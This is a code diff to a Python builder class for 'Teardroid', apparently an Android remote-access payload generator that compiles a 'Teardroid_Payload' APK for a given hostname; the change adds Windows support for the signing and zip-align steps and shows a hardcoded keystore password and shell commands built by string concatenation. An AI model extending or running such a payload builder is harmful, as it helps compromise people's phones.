@@ -7,6 +7,7 @@ class Teardroid:
         self.name = name
         self.AppInfo = os.path.join(os.getcwd(
         ), "Teardroid_Payload", "smali", "com", "example", "teardroidv2", "AppInfo.smali")
+        self.os = os.name
 
     def build(self, hostname) -> None:
         self.print_result("Building Teardroid")
@@ -53,11 +54,21 @@ class Teardroid:
             filewriter.writelines(data)
 
     def SingAPK(self) -> None:
-        os.system(os.path.join(os.getcwd(), "apksigner") +
+        apksigner = None
+        if self.os == "posix":
+            apksigner = os.path.join(os.getcwd(), "apksigner")
+        else:
+            apksigner = os.path.join(os.getcwd(), "apksigner.bat")
+        os.system(apksigner +
                   " sign --ks hacksec.jks --ks-key-alias key0 --ks-pass pass:root1337 --key-pass pass:root1337 " + self.name + ".apk")
 
     def CompressAPK(self) -> None:
-        os.system(os.path.join(os.getcwd(), "zipalign") + " -v 4 " + self.name +
+        zipalign = None
+        if self.os == "posix":
+            zipalign = os.path.join(os.getcwd(), "zipalign")
+        else:
+            zipalign = os.path.join(os.getcwd(), "zipalign.exe")
+        os.system(zipalign + " -v 4 " + self.name +
                   "_uncompressed.apk " + self.name + ".apk")
 
     def Clear(self) -> None:
